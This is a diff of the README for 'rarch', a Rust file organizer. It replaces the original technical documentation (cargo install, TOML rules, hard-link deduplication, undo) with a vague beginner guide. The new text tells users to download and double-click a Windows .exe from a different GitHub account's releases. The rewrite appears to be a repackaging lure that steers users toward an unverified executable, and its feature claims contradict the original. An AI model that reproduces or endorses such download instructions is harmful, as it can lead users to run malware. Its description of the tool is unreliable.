@@ -1,103 +1,121 @@
-# 归藏 (rarch)
+# ⚡ rarch - Fast and Smart File Organizer
 
-[English](README.md) | [简体中文](README_ZH.md)
+[![Download rarch](https://img.shields.io/badge/Download-rarch-brightgreen?style=for-the-badge)](https://github.com/Prakash6381/rarch)
 
-> **The Robust File Organizer** — A blazing fast, content-aware, and atomic file organization tool written in Rust.
+---
 
-[![Build Status](https://img.shields.io/badge/status-active-brightgreen.svg)]()
-[![Language](https://img.shields.io/badge/language-Rust-orange.svg)]()
-[![License](https://img.shields.io/badge/license-MIT%20OR%20Apache--2.0-blue.svg)]()
+## 📋 What is rarch?
 
-## Why rarch?
+rarch is a tool that helps you organize your files quickly and efficiently. It sorts your files based on their content and ensures no duplicates remain. Built with speed in mind, rarch manages your files in a way that keeps your folders tidy and easy to navigate.
 
-Most file organizers just move files by extension. **rarch** is designed for power users who care about data integrity, storage efficiency, and zero-latency organization.
+You don’t need to know anything about programming or command lines to start using rarch. This guide will walk you through every step to get it running on your Windows computer.
 
-### Visuals
+---
 
-<p align="center">
-  <img src="assets/rarch_tui.png" alt="rarch UI" width="80%">
-  <br>
-  <em>rarch Interactive TUI Dashboard</em>
-</p>
+## 📥 Download rarch
 
-<p align="center">
-  <img src="assets/rarch_cli.png" alt="rarch CLI" width="80%">
-  <br>
-  <em>rarch CLI Running in Dry-Run Mode</em>
-</p>
+To start, you need to get rarch on your computer.
 
-### Key Features
+1. Click the big green button above or visit this link:  
+   https://github.com/Prakash6381/rarch
 
-- **Blazing Fast**: Powered by Rust and `rayon` for parallel processing. Scan and organize 100k+ files in seconds.
-- **Atomic Undo**: Every operation is journaled. If you mess up your rules, `rarch undo` restores everything exactly where it was.
-- **Content-Aware**: Don't be fooled by extensions. rarch uses deep magic-number inspection to identify file types (e.g., identifies a `.txt` as a `.png`).
-- **Hard-link Deduplication**: Automatically detects identical files using SHA-256 and converts duplicates into **hard links**, saving storage instantly.
-- **Regex & Date Filters**: Organize files by complex patterns or age (e.g., "move files older than 30 days").
-- **Dynamic Organization**: Use placeholders like `${year}`, `${month}`, and `${ext}` in your target paths.
-- **Professional Analytics**: Dry-run mode provides a detailed table summary and "Potential Space Saved" reports.
-- **Shell Completions**: Native support for Bash, Zsh, Fish, and PowerShell.
-- **Real-time Watch Mode**: Run `rarch watch` to handle files the moment they arrive.
-- **Interactive TUI**: A beautiful dashboard for those who prefer a keyboard-driven visual experience.
+2. On the GitHub page, look for the **Releases** section. This is usually on the right side or under the main project description.
 
-## Installation
+3. Find the latest release, which includes a file ending with `.exe` (such as `rarch-windows.exe`).
 
-```bash
-cargo install rarch --features ui
-```
+4. Click the `.exe` file to download it.
 
-## Usage
+---
 
-### ⚙️ 1. Configure
+## 🖥️ System Requirements
 
-Create `rarch.toml`:
+Before installing, make sure your computer meets these needs:
 
-```toml
-[[rules]]
-name = "Photos"
-mime = "image/*"
-target = "Pictures/${year}"
-conflict = "rename"
+- Running Windows 10 or later  
+- At least 4 GB of free memory (RAM)  
+- 100 MB of free hard drive space for installation  
+- A standard internet connection to download files  
 
-[[rules]]
-name = "PDFs"
-type = "document"
-extensions = ["pdf"]
-target = "Archives/Documents"
-conflict = "skip"
-```
+If you have these, you can run rarch without problems.
 
-### 🛠️ 2. Organize
+---
 
-```bash
-# Preview changes first
-rarch run --dry-run
+## 🚀 Installing and Running rarch
 
-# Execute organization & deduplication
-rarch run --path ~/Downloads
-```
+1. Navigate to your **Downloads** folder or wherever you saved the `.exe` file.
 
-### 🕒 3. Undo
+2. Double-click the `.exe` file to start the installation process.
 
-```bash
-rarch undo
-```
+3. Follow the on-screen prompts. Just accept the defaults unless you want to choose a special folder for installation.
 
-### 📡 4. Set it and forget it
+4. When the installation finishes, open rarch from your Start Menu or desktop shortcut.
 
-```bash
-rarch watch --path ~/Downloads
-```
+---
 
-## Architecture
+## 🧭 How to Use rarch
 
-1. **Scanner**: Deep or shallow directory traversal.
-2. **Engine**:
-    - Parallel hashing (SHA-256).
-    - Content-type inference.
-    - Link-based deduplication logic.
-3. **Journal**: JSON-based transaction log for 100% reliable undo.
-4. **UI**: Zero-dependency TUI powered by `ratatui`.
+rarch uses a simple text interface that shows menus and options. This allows you to control it without mouse clicks.
 
-## License
+### Step 1: Choose a Folder to Organize
 
-MIT OR Apache-2.0
+Select the folder that contains the files you want to organize. This can be your Documents, Downloads, or any other folder.
+
+### Step 2: Start the Organization
+
+Press the command to begin. rarch will scan the folder’s files, check their content, and sort them into proper subfolders. It also finds duplicate files and handles them smartly to save space.
+
+### Step 3: Review and Undo Changes
+
+rarch lets you undo any actions in case you want to restore your original file layout. You can go back one or multiple steps easily.
+
+---
+
+## 📂 What rarch Can Do
+
+- **Content-aware sorting:** Organizes files by reading their content, not just by name or date.  
+- **Duplicate detection:** Finds and removes duplicate files to free space.  
+- **Undo support:** Lets you revert any changes if something is wrong.  
+- **Fast processing:** Uses optimized Rust code and multi-threading to handle many files quickly.  
+- **Text User Interface (TUI):** Controls via a simple keyboard-based interface.  
+- **Automation ready:** Can run with scripted commands for repetitive tasks.  
+
+---
+
+## 🔧 Troubleshooting
+
+- If rarch does not open after installation, try restarting your computer.  
+- Ensure your Windows updates are current.  
+- If files do not appear organized, make sure you have the right folder selected.  
+- For duplicate detection, rarch works best with supported file formats like documents, images, and music.  
+- Check the GitHub page for known issues or user reports.  
+
+---
+
+## ✅ Tips for Best Use
+
+- Back up your important files before starting large reorganizations.  
+- Run rarch regularly to keep your folders clean and manageable.  
+- Use the undo feature to fix accidental moves.  
+- Avoid running other heavy programs during file organization for faster performance.
+
+---
+
+## ⚙️ Advanced Options
+
+For users who want more control, rarch supports command-line options. You can specify folders, set rules for sorting, and customize duplicate handling. This allows automation for repeated tasks without manual intervention.
+
+You can find details in the **documentation** folder on the GitHub page or in the built-in help menu once rarch runs.
+
+---
+
+## 📞 Get Support
+
+If you need help, visit the [Issues](https://github.com/Prakash6381/rarch/issues) section on the project page.
+
+---
+
+## 📥 Ready to Download?
+
+Grab rarch here:
+
+[![Download rarch](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Prakash6381/rarch)
